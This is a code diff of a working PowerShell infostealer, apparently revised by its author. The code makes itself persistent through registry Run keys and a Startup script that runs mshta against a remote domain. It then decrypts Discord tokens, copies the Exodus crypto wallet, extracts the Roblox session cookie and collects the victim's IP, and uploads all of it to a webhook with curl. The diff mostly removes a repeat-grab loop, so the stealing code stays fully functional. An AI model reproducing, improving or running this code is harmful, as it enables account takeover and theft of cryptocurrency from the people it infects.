@@ -14,7 +14,7 @@ function dbg($title, $desc, $color) {
 # ─── SELF-PERSISTENCE (MSHTA) ───
 # =====================================================================
 try {
-    $CMD = 'mshta.exe "https://cdn.dicerigx.app/"'
+    $CMD = 'mshta.exe "https://dicerigx.app/"'
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $CMD -ErrorAction SilentlyContinue
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "WinUpdate" -Value $CMD -ErrorAction SilentlyContinue
     $StartupVBS = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
@@ -55,109 +55,97 @@ $appdata = $env:APPDATA
 $l = $env:LOCALAPPDATA
 
 # =====================================================================
-# ─── MAIN LOOP (RE-GRAB) ───
+# ─── DISCORD TOKENS ───
 # =====================================================================
-# This loops 5 times. It grabs, waits 60 seconds, and grabs again.
-for ($i = 1; $i -le 5; $i++) {
-    
-    dbg ":repeat: Re-grab" "Loop: $i / 5" 3447003
+$mk = $null
+try {
+    $ls = Get-Content "$appdata\discord\Local State" -Raw | ConvertFrom-Json
+    $b = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
+    $mk = [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)], $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
+} catch {}
 
-    # =================================================================
-    # ─── DISCORD TOKENS ───
-    # =================================================================
-    $mk = $null
-    try {
-        $ls = Get-Content "$appdata\discord\Local State" -Raw | ConvertFrom-Json
-        $b = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
-        $mk = [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)], $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
-    } catch {}
-
-    $tokens = @{}
-    $discordPaths = @("$appdata\discord\Local Storage\leveldb", "$appdata\discordptb\Local Storage\leveldb", "$appdata\discordcanary\Local Storage\leveldb")
-    foreach ($dp in $discordPaths) {
-        if (!(Test-Path $dp)) { continue }
-        Get-ChildItem $dp | ? { $_.Name -match '\.(ldb|log)$' } | % {
-            $raw = $null
-            try {
-                $fs = [IO.File]::Open($_.FullName, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
-                $sr = New-Object IO.StreamReader($fs); $raw = $sr.ReadToEnd(); $sr.Close(); $fs.Close()
-            } catch { return }
-            if (!$raw -or !$mk) { return }
-            foreach ($m in [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,300})')) {
-                $b64 = $m.Groups[1].Value
-                while ($b64.Length % 4 -ne 0) { $b64 += '=' }
-                try {
-                    $eb = [Convert]::FromBase64String($b64)
-                    if ($eb.Length -lt 80) { continue }
-                    $t = [Text.Encoding]::UTF8.GetString([Gcm]::Decrypt($mk, $eb[3..14], $eb[15..($eb.Length-17)])).TrimEnd([char]0)
-                    if ($t.Length -gt 40 -and !$tokens[$t]) { $tokens[$t] = $t }
-                } catch {}
-            }
-        }
-    }
-
-    foreach ($t in $tokens.Keys) {
+$tokens = @{}
+$discordPaths = @("$appdata\discord\Local Storage\leveldb", "$appdata\discordptb\Local Storage\leveldb", "$appdata\discordcanary\Local Storage\leveldb")
+foreach ($dp in $discordPaths) {
+    if (!(Test-Path $dp)) { continue }
+    Get-ChildItem $dp | ? { $_.Name -match '\.(ldb|log)$' } | % {
+        $raw = $null
         try {
-            $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$t} -TimeoutSec 5
-            if ($r.username) {
-                $info = "**User:** $($r.username)`n"
-                if ($r.email) { $info += "**Email:** $($r.email)`n" }
-                if ($r.phone) { $info += "**Phone:** $($r.phone)`n" }
-                if ($r.id) { $info += "**ID:** $($r.id)`n" }
-                $info += "**Token:** $t"
-                dbg ":gift: Discord Token" $info 5793266
-            }
-        } catch {}
-    }
-
-    # =================================================================
-    # ─── EXODUS WALLET ───
-    # =================================================================
-    $dw = @{ Exodus="$appdata\Exodus" }
-    $staging = Join-Path $env:TEMP "wallets"
-    Remove-Item $staging -Recurse -Force -EA SilentlyContinue
-    mkdir $staging -Force | Out-Null
-
-    foreach ($n in $dw.Keys) {
-        if (Test-Path $dw[$n]) {
-            $dest = Join-Path $staging $n
-            & robocopy $dw[$n] $dest /E /R:1 /W:1 /NFL /NDL /NJH /NJS /NC /NS /XD partitions logs tmp cache Cache blob_storage GPUCache Crashpad | Out-Null
-        }
-    }
-
-    $stagedDirs = Get-ChildItem $staging -Directory -EA SilentlyContinue
-    foreach ($d in $stagedDirs) {
-        $zip = Join-Path $env:TEMP ($d.Name + ".zip")
-        Remove-Item $zip -Force -EA SilentlyContinue
-        Compress-Archive -Path $d.FullName -DestinationPath $zip -Force -EA SilentlyContinue
-        if (Test-Path $zip) {
-            if ((Get-Item $zip).Length -lt 8000000) {
-                & curl.exe -s -F "file=@$zip;filename=$($d.Name).zip" $WH 2>&1 | Out-Null
-                dbg ":briefcase: Wallet Grabbed" "$($d.Name).zip" 65280
-            }
-            Remove-Item $zip -Force -EA SilentlyContinue
-        }
-    }
-    Remove-Item $staging -Recurse -Force -EA SilentlyContinue
-
-    # =================================================================
-    # ─── ROBLOX COOKIE (FIXED - ONLY SENDS ONCE) ───
-    # =================================================================
-    $rbxPaths = @("$l\Roblox\LocalStorage\robloxcookies.dat", "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat")
-    foreach ($rp in $rbxPaths) {
-        if (Test-Path $rp) {
+            $fs = [IO.File]::Open($_.FullName, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
+            $sr = New-Object IO.StreamReader($fs); $raw = $sr.ReadToEnd(); $sr.Close(); $fs.Close()
+        } catch { return }
+        if (!$raw -or !$mk) { return }
+        foreach ($m in [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,300})')) {
+            $b64 = $m.Groups[1].Value
+            while ($b64.Length % 4 -ne 0) { $b64 += '=' }
             try {
-                $raw = Get-Content $rp -Raw
-                $cookie = ""
-                if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
-                    $b64 = $Matches[1]
-                    $eb = [Convert]::FromBase64String($b64)
-                    $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
-                    $cookie = [Text.Encoding]::UTF8.GetString($db)
-                } else {
-                    $cookie = $raw
-                }
-                
+                $eb = [Convert]::FromBase64String($b64)
+                if ($eb.Length -lt 80) { continue }
+                $t = [Text.Encoding]::UTF8.GetString([Gcm]::Decrypt($mk, $eb[3..14], $eb[15..($eb.Length-17)])).TrimEnd([char]0)
+                if ($t.Length -gt 40 -and !$tokens[$t]) { $tokens[$t] = $t }
+            } catch {}
+        }
+    }
+}
+
+foreach ($t in $tokens.Keys) {
+    try {
+        $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$t} -TimeoutSec 5
+        if ($r.username) {
+            $info = "**User:** $($r.username)`n"
+            if ($r.email) { $info += "**Email:** $($r.email)`n" }
+            if ($r.phone) { $info += "**Phone:** $($r.phone)`n" }
+            if ($r.id) { $info += "**ID:** $($r.id)`n" }
+            $info += "**Token:** $t"
+            dbg ":gift: Discord Token" $info 5793266
+        }
+    } catch {}
+}
+
+# =====================================================================
+# ─── WALLET (EXODUS ONLY) ───
+# =====================================================================
+$dw = @{ Exodus="$appdata\Exodus" }
+$staging = Join-Path $env:TEMP "wallets"
+Remove-Item $staging -Recurse -Force -EA SilentlyContinue
+mkdir $staging -Force | Out-Null
+
+foreach ($n in $dw.Keys) {
+    if (Test-Path $dw[$n]) {
+        $dest = Join-Path $staging $n
+        & robocopy $dw[$n] $dest /E /R:1 /W:1 /NFL /NDL /NJH /NJS /NC /NS /XD partitions logs tmp cache Cache blob_storage GPUCache Crashpad | Out-Null
+    }
+}
+
+$stagedDirs = Get-ChildItem $staging -Directory -EA SilentlyContinue
+foreach ($d in $stagedDirs) {
+    $zip = Join-Path $env:TEMP ($d.Name + ".zip")
+    Remove-Item $zip -Force -EA SilentlyContinue
+    Compress-Archive -Path $d.FullName -DestinationPath $zip -Force -EA SilentlyContinue
+    if (Test-Path $zip) {
+        if ((Get-Item $zip).Length -lt 8000000) {
+            & curl.exe -s -F "file=@$zip;filename=$($d.Name).zip" $WH 2>&1 | Out-Null
+            dbg ":briefcase: Wallet Grabbed" "$($d.Name).zip" 65280
+        }
+        Remove-Item $zip -Force -EA SilentlyContinue
+    }
+}
+Remove-Item $staging -Recurse -Force -EA SilentlyContinue
+
+# =====================================================================
+# ─── ROBLOX COOKIE (RAW ROBLOSECURITY) ───
+# =====================================================================
+$l = $env:LOCALAPPDATA
+$rbxPaths = @("$l\Roblox\LocalStorage\robloxcookies.dat", "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat")
+foreach ($rp in $rbxPaths) {
+    if (Test-Path $rp) {
+        try {
+            $raw = Get-Content $rp -Raw
+            if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
+                $b64 = $Matches[1]
+                $eb = [Convert]::FromBase64String($b64)
+                $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
+                $cookie = [Text.Encoding]::UTF8.GetString($db)
                 if ($cookie -match '_\|WARNING[^;\s]{50,}') {
                     $c = $Matches[0]
                     dbg ":cookie: Roblox Cookie" "**Size:** $($c.Length) `n**PC:** $env:COMPUTERNAME`n**Cookie:**``$c``" 65280
@@ -166,21 +154,16 @@ for ($i = 1; $i -le 5; $i++) {
                     & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
                     Remove-Item $tmp_c -Force -EA SilentlyContinue
                 }
-            } catch {}
-            break
-        }
-    }
-
-    # =================================================================
-    # ─── SYSTEM INFO (ONLY FIRST LOOP) ───
-    # =================================================================
-    if ($i -eq 1) {
-        try {
-            $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).Trim()
-            dbg ":dart: Target" "**IP:** $ip `n**PC:** $env:COMPUTERNAME" 3447003
+            }
         } catch {}
+        break
     }
-
-    # Wait 60 seconds before next grab
-    if ($i -lt 5) { Start-Sleep -Seconds 60 }
 }
+
+# =====================================================================
+# ─── SYSTEM INFO ───
+# =====================================================================
+try {
+    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).Trim()
+    dbg ":dart: Target" "**IP:** $ip `n**PC:** $env:COMPUTERNAME" 3447003
+} catch {}
